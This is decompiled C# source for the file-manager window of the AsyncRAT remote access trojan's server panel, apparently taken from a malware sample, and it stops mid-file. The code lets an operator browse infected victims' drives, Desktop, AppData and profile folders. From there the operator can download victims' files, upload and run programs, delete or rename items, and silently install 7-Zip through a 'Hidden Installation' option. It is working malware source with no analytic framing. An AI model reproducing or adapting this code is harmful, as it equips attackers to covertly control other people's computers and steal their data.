// Decompiled with JetBrains decompiler
// Type: Server.Forms.FormFileManager
// Assembly: AsyncRAT, Version=0.5.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 51786A10-CF9D-455B-B8A4-B82CB9EDE322
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-bb1f2c2c9b279790b67eaea6ab0bbce3a4d4432bbe1bd716750f2f9ba3337f7e.exe

using Microsoft.VisualBasic;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Server.Forms
{
  public class FormFileManager : Form
  {
    private IContainer components;
    public ListView listView1;
    public ImageList imageList1;
    private ContextMenuStrip contextMenuStrip1;
    private ToolStripMenuItem backToolStripMenuItem;
    public StatusStrip statusStrip1;
    public ToolStripStatusLabel toolStripStatusLabel1;
    public ToolStripStatusLabel toolStripStatusLabel2;
    private ToolStripMenuItem downloadToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator1;
    private ToolStripMenuItem uPLOADToolStripMenuItem;
    private ToolStripMenuItem dELETEToolStripMenuItem;
    private ToolStripMenuItem rEFRESHToolStripMenuItem;
    private ToolStripMenuItem eXECUTEToolStripMenuItem;
    private ToolStripMenuItem gOTOToolStripMenuItem;
    private ToolStripMenuItem dESKTOPToolStripMenuItem;
    private ToolStripMenuItem aPPDATAToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator4;
    private ToolStripMenuItem createFolderToolStripMenuItem;
    private ToolStripMenuItem copyToolStripMenuItem;
    private ToolStripMenuItem pasteToolStripMenuItem;
    private ToolStripMenuItem renameToolStripMenuItem;
    public ToolStripStatusLabel toolStripStatusLabel3;
    private ToolStripMenuItem userProfileToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator2;
    private ToolStripMenuItem driversListsToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator3;
    private ToolStripMenuItem openClientFolderToolStripMenuItem;
    public System.Windows.Forms.Timer timer1;
    private ToolStripSeparator toolStripSeparator5;
    private ToolStripMenuItem cutToolStripMenuItem1;
    private ToolStripMenuItem sevenZiplStripMenuItem1;
    private ToolStripMenuItem installToolStripMenuItem;
    private ToolStripSeparator toolStripSeparator6;
    private ToolStripMenuItem zipToolStripMenuItem;
    private ToolStripMenuItem unzipToolStripMenuItem;
    private ColumnHeader columnHeader1;
    private ColumnHeader columnHeader2;

    public Form1 F { get; set; }

    internal Clients Client { get; set; }

    public string FullPath { get; set; }

    public FormFileManager() => this.InitializeComponent();

    private void listView1_DoubleClick(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count != 1)
          return;
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "fileManager";
        msgPack.ForcePathObject("Command").AsString = "getPath";
        msgPack.ForcePathObject("Path").AsString = this.listView1.SelectedItems[0].ToolTipText;
        this.listView1.Enabled = false;
        this.toolStripStatusLabel3.ForeColor = Color.Green;
        this.toolStripStatusLabel3.Text = "Please Wait";
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
      }
      catch
      {
      }
    }

    private void backToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        string text = this.toolStripStatusLabel1.Text;
        if (text.Length <= 3)
        {
          msgPack.ForcePathObject("Packet").AsString = "fileManager";
          msgPack.ForcePathObject("Command").AsString = "getDrivers";
          this.toolStripStatusLabel1.Text = "";
          ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
        }
        else
        {
          string str = text.Remove(text.LastIndexOfAny(new char[1]
          {
            '\\'
          }, text.LastIndexOf('\\')));
          msgPack.ForcePathObject("Packet").AsString = "fileManager";
          msgPack.ForcePathObject("Command").AsString = "getPath";
          msgPack.ForcePathObject("Path").AsString = str + "\\";
          ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
        }
      }
      catch
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "fileManager";
        msgPack.ForcePathObject("Command").AsString = "getDrivers";
        this.toolStripStatusLabel1.Text = "";
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
      }
    }

    private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count <= 0)
          return;
        if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID)))
          Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + this.Client.ID));
        foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
        {
          if (selectedItem.ImageIndex == 0 && selectedItem.ImageIndex == 1 && selectedItem.ImageIndex == 2)
            break;
          MsgPack msgPack = new MsgPack();
          string dwid = Guid.NewGuid().ToString();
          msgPack.ForcePathObject("Packet").AsString = "fileManager";
          msgPack.ForcePathObject("Command").AsString = "socketDownload";
          msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
          msgPack.ForcePathObject("DWID").AsString = dwid;
          ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
          this.BeginInvoke((Delegate) (() =>
          {
            if ((FormDownloadFile) Application.OpenForms["socketDownload:" + dwid] != null)
              return;
            new FormDownloadFile()
            {
              Name = ("socketDownload:" + dwid),
              Text = ("socketDownload:" + this.Client.ID),
              F = this.F,
              DirPath = this.FullPath
            }.Show();
          }));
        }
      }
      catch
      {
      }
    }

    private void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.toolStripStatusLabel1.Text.Length < 3)
        return;
      try
      {
        OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.Multiselect = true;
        if (openFileDialog.ShowDialog() != DialogResult.OK)
          return;
        foreach (string fileName in openFileDialog.FileNames)
        {
          if ((FormDownloadFile) Application.OpenForms["socketDownload:"] == null)
          {
            FormDownloadFile formDownloadFile1 = new FormDownloadFile();
            formDownloadFile1.Name = "socketUpload:" + Guid.NewGuid().ToString();
            formDownloadFile1.Text = "socketUpload:" + this.Client.ID;
            formDownloadFile1.F = Program.form1;
            formDownloadFile1.Client = this.Client;
            FormDownloadFile formDownloadFile2 = formDownloadFile1;
            formDownloadFile2.FileSize = new FileInfo(fileName).Length;
            formDownloadFile2.labelfile.Text = Path.GetFileName(fileName);
            formDownloadFile2.FullFileName = fileName;
            formDownloadFile2.label1.Text = "Upload:";
            formDownloadFile2.ClientFullFileName = this.toolStripStatusLabel1.Text + "\\" + Path.GetFileName(fileName);
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "fileManager";
            msgPack.ForcePathObject("Command").AsString = "reqUploadFile";
            msgPack.ForcePathObject("ID").AsString = formDownloadFile2.Name;
            formDownloadFile2.Show();
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
          }
        }
      }
      catch
      {
      }
    }

    private void dELETEToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count <= 0)
          return;
        foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
        {
          if (selectedItem.ImageIndex != 0 && selectedItem.ImageIndex != 1 && selectedItem.ImageIndex != 2)
          {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "fileManager";
            msgPack.ForcePathObject("Command").AsString = "deleteFile";
            msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
          }
          else if (selectedItem.ImageIndex == 0)
          {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "fileManager";
            msgPack.ForcePathObject("Command").AsString = "deleteFolder";
            msgPack.ForcePathObject("Folder").AsString = selectedItem.ToolTipText;
            ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
          }
        }
      }
      catch
      {
      }
    }

    private void rEFRESHToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.toolStripStatusLabel1.Text != "")
        {
          MsgPack msgPack = new MsgPack();
          msgPack.ForcePathObject("Packet").AsString = "fileManager";
          msgPack.ForcePathObject("Command").AsString = "getPath";
          msgPack.ForcePathObject("Path").AsString = this.toolStripStatusLabel1.Text;
          ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
        }
        else
        {
          MsgPack msgPack = new MsgPack();
          msgPack.ForcePathObject("Packet").AsString = "fileManager";
          msgPack.ForcePathObject("Command").AsString = "getDrivers";
          ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
        }
      }
      catch
      {
      }
    }

    private void eXECUTEToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count <= 0)
          return;
        foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
        {
          MsgPack msgPack = new MsgPack();
          msgPack.ForcePathObject("Packet").AsString = "fileManager";
          msgPack.ForcePathObject("Command").AsString = "execute";
          msgPack.ForcePathObject("File").AsString = selectedItem.ToolTipText;
          ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
        }
      }
      catch
      {
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      try
      {
        if (this.Client.TcpClient.Connected)
          return;
        this.Close();
      }
      catch
      {
        this.Close();
      }
    }

    private void DESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "fileManager";
        msgPack.ForcePathObject("Command").AsString = "getPath";
        msgPack.ForcePathObject("Path").AsString = "DESKTOP";
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
      }
      catch
      {
      }
    }

    private void APPDATAToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "fileManager";
        msgPack.ForcePathObject("Command").AsString = "getPath";
        msgPack.ForcePathObject("Path").AsString = "APPDATA";
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
      }
      catch
      {
      }
    }

    private void CreateFolderToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        string path2 = Interaction.InputBox("Create Folder", "Name", Path.GetRandomFileName().Replace(".", ""));
        if (string.IsNullOrEmpty(path2))
          return;
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "fileManager";
        msgPack.ForcePathObject("Command").AsString = "createFolder";
        msgPack.ForcePathObject("Folder").AsString = Path.Combine(this.toolStripStatusLabel1.Text, path2);
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
      }
      catch
      {
      }
    }

    private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count <= 0)
          return;
        StringBuilder stringBuilder = new StringBuilder();
        foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
          stringBuilder.Append(selectedItem.ToolTipText + "-=>");
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "fileManager";
        msgPack.ForcePathObject("Command").AsString = "copyFile";
        msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
        msgPack.ForcePathObject("IO").AsString = "copy";
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
      }
      catch
      {
      }
    }

    private void PasteToolStripMenuItem_Click_1(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "fileManager";
        msgPack.ForcePathObject("Command").AsString = "pasteFile";
        msgPack.ForcePathObject("File").AsString = this.toolStripStatusLabel1.Text;
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
      }
      catch
      {
      }
    }

    private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.listView1.SelectedItems.Count != 1)
        return;
      try
      {
        string path2 = Interaction.InputBox("Rename File or Folder", "Name", this.listView1.SelectedItems[0].Text);
        if (string.IsNullOrEmpty(path2))
          return;
        if (this.listView1.SelectedItems[0].ImageIndex != 0 && this.listView1.SelectedItems[0].ImageIndex != 1 && this.listView1.SelectedItems[0].ImageIndex != 2)
        {
          MsgPack msgPack = new MsgPack();
          msgPack.ForcePathObject("Packet").AsString = "fileManager";
          msgPack.ForcePathObject("Command").AsString = "renameFile";
          msgPack.ForcePathObject("File").AsString = this.listView1.SelectedItems[0].ToolTipText;
          msgPack.ForcePathObject("NewName").AsString = Path.Combine(this.toolStripStatusLabel1.Text, path2);
          ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
        }
        else
        {
          if (this.listView1.SelectedItems[0].ImageIndex != 0)
            return;
          MsgPack msgPack = new MsgPack();
          msgPack.ForcePathObject("Packet").AsString = "fileManager";
          msgPack.ForcePathObject("Command").AsString = "renameFolder";
          msgPack.ForcePathObject("Folder").AsString = this.listView1.SelectedItems[0].ToolTipText + "\\";
          msgPack.ForcePathObject("NewName").AsString = Path.Combine(this.toolStripStatusLabel1.Text, path2);
          ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
        }
      }
      catch
      {
      }
    }

    private void UserProfileToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "fileManager";
        msgPack.ForcePathObject("Command").AsString = "getPath";
        msgPack.ForcePathObject("Path").AsString = "USER";
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
      }
      catch
      {
      }
    }

    private void DriversListsToolStripMenuItem_Click(object sender, EventArgs e)
    {
      MsgPack msgPack = new MsgPack();
      msgPack.ForcePathObject("Packet").AsString = "fileManager";
      msgPack.ForcePathObject("Command").AsString = "getDrivers";
      this.toolStripStatusLabel1.Text = "";
      ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
    }

    private void OpenClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (!Directory.Exists(this.FullPath))
          Directory.CreateDirectory(this.FullPath);
        Process.Start(this.FullPath);
      }
      catch
      {
      }
    }

    private void FormFileManager_FormClosed(object sender, FormClosedEventArgs e) => ThreadPool.QueueUserWorkItem((WaitCallback) (o => this.Client?.Disconnected()));

    private void CutToolStripMenuItem1_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count <= 0)
          return;
        StringBuilder stringBuilder = new StringBuilder();
        foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
          stringBuilder.Append(selectedItem.ToolTipText + "-=>");
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "fileManager";
        msgPack.ForcePathObject("Command").AsString = "copyFile";
        msgPack.ForcePathObject("File").AsString = stringBuilder.ToString();
        msgPack.ForcePathObject("IO").AsString = "cut";
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
      }
      catch
      {
      }
    }

    private void ZipToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count <= 0)
          return;
        StringBuilder stringBuilder = new StringBuilder();
        foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
          stringBuilder.Append(selectedItem.ToolTipText + "-=>");
        MsgPack msgPack = new MsgPack();
        msgPack.ForcePathObject("Packet").AsString = "fileManager";
        msgPack.ForcePathObject("Command").AsString = "zip";
        msgPack.ForcePathObject("Path").AsString = stringBuilder.ToString();
        msgPack.ForcePathObject("Zip").AsString = "true";
        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
      }
      catch
      {
      }
    }

    private void UnzipToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.listView1.SelectedItems.Count <= 0)
          return;
        foreach (ListViewItem selectedItem in this.listView1.SelectedItems)
        {
          MsgPack msgPack = new MsgPack();
          msgPack.ForcePathObject("Packet").AsString = "fileManager";
          msgPack.ForcePathObject("Command").AsString = "zip";
          msgPack.ForcePathObject("Path").AsString = selectedItem.ToolTipText;
          msgPack.ForcePathObject("Zip").AsString = "false";
          ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
        }
      }
      catch
      {
      }
    }

    private void InstallToolStripMenuItem_Click(object sender, EventArgs e)
    {
      MsgPack msgPack = new MsgPack();
      msgPack.ForcePathObject("Packet").AsString = "fileManager";
      msgPack.ForcePathObject("Command").AsString = "installZip";
      msgPack.ForcePathObject("exe").SetAsBytes(Resources._7z);
      msgPack.ForcePathObject("dll").SetAsBytes(Resources._7z1);
      ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), (object) msgPack.Encode2Bytes());
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ListViewGroup listViewGroup1 = new ListViewGroup("Folders", HorizontalAlignment.Left);
      ListViewGroup listViewGroup2 = new ListViewGroup("File", HorizontalAlignment.Left);
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormFileManager));
      this.listView1 = new ListView();
      this.contextMenuStrip1 = new ContextMenuStrip(this.components);
      this.backToolStripMenuItem = new ToolStripMenuItem();
      this.rEFRESHToolStripMenuItem = new ToolStripMenuItem();
      this.gOTOToolStripMenuItem = new ToolStripMenuItem();
      this.dESKTOPToolStripMenuItem = new ToolStripMenuItem();
      this.aPPDATAToolStripMenuItem = new ToolStripMenuItem();
      this.userProfileToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator2 = new ToolStripSeparator();
      this.driversListsToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator1 = new ToolStripSeparator();
      this.downloadToolStripMenuItem = new ToolStripMenuItem();
      this.uPLOADToolStripMenuItem = new ToolStripMenuItem();
      this.eXECUTEToolStripMenuItem = new ToolStripMenuItem();
      this.renameToolStripMenuItem = new ToolStripMenuItem();
      this.copyToolStripMenuItem = new ToolStripMenuItem();
      this.cutToolStripMenuItem1 = new ToolStripMenuItem();
      this.pasteToolStripMenuItem = new ToolStripMenuItem();
      this.dELETEToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator4 = new ToolStripSeparator();
      this.sevenZiplStripMenuItem1 = new ToolStripMenuItem();
      this.installToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator6 = new ToolStripSeparator();
      this.zipToolStripMenuItem = new ToolStripMenuItem();
      this.unzipToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator5 = new ToolStripSeparator();
      this.createFolderToolStripMenuItem = new ToolStripMenuItem();
      this.toolStripSeparator3 = new ToolStripSeparator();
      this.openClientFolderToolStripMenuItem = new ToolStripMenuItem();
      this.imageList1 = new ImageList(this.components);
      this.statusStrip1 = new StatusStrip();
      this.toolStripStatusLabel1 = new ToolStripStatusLabel();
      this.toolStripStatusLabel2 = new ToolStripStatusLabel();
      this.toolStripStatusLabel3 = new ToolStripStatusLabel();
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.columnHeader1 = new ColumnHeader();
      this.columnHeader2 = new ColumnHeader();
      this.contextMenuStrip1.SuspendLayout();
      this.statusStrip1.SuspendLayout();
      this.SuspendLayout();
      this.listView1.AllowColumnReorder = true;
      this.listView1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.listView1.BorderStyle = BorderStyle.None;
      this.listView1.Columns.AddRange(new ColumnHeader[2]
      {
        this.columnHeader1,
        this.columnHeader2
      });
      this.listView1.ContextMenuStrip = this.contextMenuStrip1;
      listViewGroup1.Header = "Folders";
      listViewGroup1.Name = "Folders";
      listViewGroup2.Header = "File";
      listViewGroup2.Name = "File";
      this.listView1.Groups.AddRange(new ListViewGroup[2]
      {
        listViewGroup1,
        listViewGroup2
      });
      this.listView1.HideSelection = false;
      this.listView1.LargeImageList = this.imageList1;
      this.listView1.Location = new Point(0, 1);
      this.listView1.Name = "listView1";
      this.listView1.ShowItemToolTips = true;
      this.listView1.Size = new Size(1058, 511);
      this.listView1.SmallImageList = this.imageList1;
      this.listView1.TabIndex = 0;
      this.listView1.UseCompatibleStateImageBehavior = false;
      this.listView1.View = View.Tile;
      this.listView1.DoubleClick += new EventHandler(this.listView1_DoubleClick);
      this.contextMenuStrip1.ImageScalingSize = new Size(24, 24);
      this.contextMenuStrip1.Items.AddRange(new ToolStripItem[18]
      {
        (ToolStripItem) this.backToolStripMenuItem,
        (ToolStripItem) this.rEFRESHToolStripMenuItem,
        (ToolStripItem) this.gOTOToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator1,
        (ToolStripItem) this.downloadToolStripMenuItem,
        (ToolStripItem) this.uPLOADToolStripMenuItem,
        (ToolStripItem) this.eXECUTEToolStripMenuItem,
        (ToolStripItem) this.renameToolStripMenuItem,
        (ToolStripItem) this.copyToolStripMenuItem,
        (ToolStripItem) this.cutToolStripMenuItem1,
        (ToolStripItem) this.pasteToolStripMenuItem,
        (ToolStripItem) this.dELETEToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator4,
        (ToolStripItem) this.sevenZiplStripMenuItem1,
        (ToolStripItem) this.toolStripSeparator5,
        (ToolStripItem) this.createFolderToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator3,
        (ToolStripItem) this.openClientFolderToolStripMenuItem
      });
      this.contextMenuStrip1.Name = "contextMenuStrip1";
      this.contextMenuStrip1.Size = new Size(233, 476);
      this.backToolStripMenuItem.Name = "backToolStripMenuItem";
      this.backToolStripMenuItem.Size = new Size(232, 32);
      this.backToolStripMenuItem.Text = "Back";
      this.backToolStripMenuItem.Click += new EventHandler(this.backToolStripMenuItem_Click);
      this.rEFRESHToolStripMenuItem.Name = "rEFRESHToolStripMenuItem";
      this.rEFRESHToolStripMenuItem.Size = new Size(232, 32);
      this.rEFRESHToolStripMenuItem.Text = "Refresh";
      this.rEFRESHToolStripMenuItem.Click += new EventHandler(this.rEFRESHToolStripMenuItem_Click);
      this.gOTOToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[5]
      {
        (ToolStripItem) this.dESKTOPToolStripMenuItem,
        (ToolStripItem) this.aPPDATAToolStripMenuItem,
        (ToolStripItem) this.userProfileToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator2,
        (ToolStripItem) this.driversListsToolStripMenuItem
      });
      this.gOTOToolStripMenuItem.Name = "gOTOToolStripMenuItem";
      this.gOTOToolStripMenuItem.Size = new Size(232, 32);
      this.gOTOToolStripMenuItem.Text = "Go To";
      this.dESKTOPToolStripMenuItem.Name = "dESKTOPToolStripMenuItem";
      this.dESKTOPToolStripMenuItem.Size = new Size(204, 34);
      this.dESKTOPToolStripMenuItem.Text = "Desktop";
      this.dESKTOPToolStripMenuItem.Click += new EventHandler(this.DESKTOPToolStripMenuItem_Click);
      this.aPPDATAToolStripMenuItem.Name = "aPPDATAToolStripMenuItem";
      this.aPPDATAToolStripMenuItem.Size = new Size(204, 34);
      this.aPPDATAToolStripMenuItem.Text = "AppData";
      this.aPPDATAToolStripMenuItem.Click += new EventHandler(this.APPDATAToolStripMenuItem_Click);
      this.userProfileToolStripMenuItem.Name = "userProfileToolStripMenuItem";
      this.userProfileToolStripMenuItem.Size = new Size(204, 34);
      this.userProfileToolStripMenuItem.Text = "User Profile";
      this.userProfileToolStripMenuItem.Click += new EventHandler(this.UserProfileToolStripMenuItem_Click);
      this.toolStripSeparator2.Name = "toolStripSeparator2";
      this.toolStripSeparator2.Size = new Size(201, 6);
      this.driversListsToolStripMenuItem.Name = "driversListsToolStripMenuItem";
      this.driversListsToolStripMenuItem.Size = new Size(204, 34);
      this.driversListsToolStripMenuItem.Text = "Drivers";
      this.driversListsToolStripMenuItem.Click += new EventHandler(this.DriversListsToolStripMenuItem_Click);
      this.toolStripSeparator1.Name = "toolStripSeparator1";
      this.toolStripSeparator1.Size = new Size(229, 6);
      this.downloadToolStripMenuItem.Name = "downloadToolStripMenuItem";
      this.downloadToolStripMenuItem.Size = new Size(232, 32);
      this.downloadToolStripMenuItem.Text = "Download";
      this.downloadToolStripMenuItem.Click += new EventHandler(this.downloadToolStripMenuItem_Click);
      this.uPLOADToolStripMenuItem.Name = "uPLOADToolStripMenuItem";
      this.uPLOADToolStripMenuItem.Size = new Size(232, 32);
      this.uPLOADToolStripMenuItem.Text = "Upload";
      this.uPLOADToolStripMenuItem.Click += new EventHandler(this.uPLOADToolStripMenuItem_Click);
      this.eXECUTEToolStripMenuItem.Name = "eXECUTEToolStripMenuItem";
      this.eXECUTEToolStripMenuItem.Size = new Size(232, 32);
      this.eXECUTEToolStripMenuItem.Text = "Execute";
      this.eXECUTEToolStripMenuItem.Click += new EventHandler(this.eXECUTEToolStripMenuItem_Click);
      this.renameToolStripMenuItem.Name = "renameToolStripMenuItem";
      this.renameToolStripMenuItem.Size = new Size(232, 32);
      this.renameToolStripMenuItem.Text = "Rename";
      this.renameToolStripMenuItem.Click += new EventHandler(this.RenameToolStripMenuItem_Click);
      this.copyToolStripMenuItem.Name = "copyToolStripMenuItem";
      this.copyToolStripMenuItem.Size = new Size(232, 32);
      this.copyToolStripMenuItem.Text = "Copy";
      this.copyToolStripMenuItem.Click += new EventHandler(this.CopyToolStripMenuItem_Click);
      this.cutToolStripMenuItem1.Name = "cutToolStripMenuItem1";
      this.cutToolStripMenuItem1.Size = new Size(232, 32);
      this.cutToolStripMenuItem1.Text = "Cut";
      this.cutToolStripMenuItem1.Click += new EventHandler(this.CutToolStripMenuItem1_Click);
      this.pasteToolStripMenuItem.Name = "pasteToolStripMenuItem";
      this.pasteToolStripMenuItem.Size = new Size(232, 32);
      this.pasteToolStripMenuItem.Text = "Paste";
      this.pasteToolStripMenuItem.Click += new EventHandler(this.PasteToolStripMenuItem_Click_1);
      this.dELETEToolStripMenuItem.Name = "dELETEToolStripMenuItem";
      this.dELETEToolStripMenuItem.Size = new Size(232, 32);
      this.dELETEToolStripMenuItem.Text = "Delete";
      this.dELETEToolStripMenuItem.Click += new EventHandler(this.dELETEToolStripMenuItem_Click);
      this.toolStripSeparator4.Name = "toolStripSeparator4";
      this.toolStripSeparator4.Size = new Size(229, 6);
      this.sevenZiplStripMenuItem1.DropDownItems.AddRange(new ToolStripItem[4]
      {
        (ToolStripItem) this.installToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator6,
        (ToolStripItem) this.zipToolStripMenuItem,
        (ToolStripItem) this.unzipToolStripMenuItem
      });
      this.sevenZiplStripMenuItem1.Name = "sevenZiplStripMenuItem1";
      this.sevenZiplStripMenuItem1.Size = new Size(232, 32);
      this.sevenZiplStripMenuItem1.Text = "7-Zip";
      this.installToolStripMenuItem.Name = "installToolStripMenuItem";
      this.installToolStripMenuItem.Size = new Size(263, 34);
      this.installToolStripMenuItem.Text = "Hidden Installation";
      this.installToolStripMenuItem.Click += new EventHandler(this.InstallToolStripMenuItem_Click);
      this.toolStripSeparator6.Name = "toolStripSeparator6";
      this.toolStripSeparator6.Size = new Size(260, 6);
      this.zipToolStripMenuItem.Name = "zipToolStripMenuItem";
      this.zipToolStripMenuItem.Size = new Size(263, 34);
      this.zipToolStripMenuItem.Text = "Zip";
      this.zipToolStripMenuItem.Click += new EventHandler(this.ZipToolStripMenuItem_Click);
      this.unzipToolStripMenuItem.Name = "unzipToolStripMenuItem";
      this.unzipToolStripMenuItem.Size = new Size(263, 34);
      this.unzipToolStripMenuItem.Text = "Unzip";
      this.unzipToolStripMenuItem.Click += new EventHandler(this.UnzipToolStripMenuItem_Click);
      this.toolStripSeparator5.Name = "toolStripSeparator5";
      this.toolStripSeparator5.Size = new Size(229, 6);
      this.createFolderToolStripMenuItem.Name = "createFolderToolStripMenuItem";
      this.createFolderToolStripMenuItem.Size = new Size(232, 32);
      this.createFolderToolStripMenuItem.Text = "Create Folder";
      this.createFolderToolStripMenuItem.Click += new EventHandler(this.CreateFolderToolStripMenuItem_Click);
      this.toolStripSeparator3.Name = "toolStripSeparator3";
      this.toolStripSeparator3.Size = new Size(229, 6);
      this.openClientFolderToolStripMenuItem.Name = "openClientFolderToolStripMenuItem";
      this.openClientFolderToolStripMenuItem.Size = new Size(232, 32);
      this.openClientFolderToolStripMenuItem.Text = "Open Client Folder";
      this.openClientFolderToolStripMenuItem.Click += new EventHandler(this.OpenClientFolderToolStripMenuItem_Click);
      this.imageList1.ImageStream = (ImageListStreamer) componentResourceManager.GetObject("imageList1.ImageStream");
      this.imageList1.TransparentColor = Color.Transparent;
      this.imageList1.Images.SetKeyName(0, "AsyncFolder.ico");
      this.imageList1.Images.SetKeyName(1, "AsyncHDDFixed.png");
      this.imageList1.Images.SetKeyName(2, "AsyncUSB.png");
      this.statusStrip1.AutoSize = false;
      this.statusStrip1.ImageScalingSize = new Size(24, 24);
      this.statusStrip1.Items.AddRange(new ToolStripItem[3]
      {
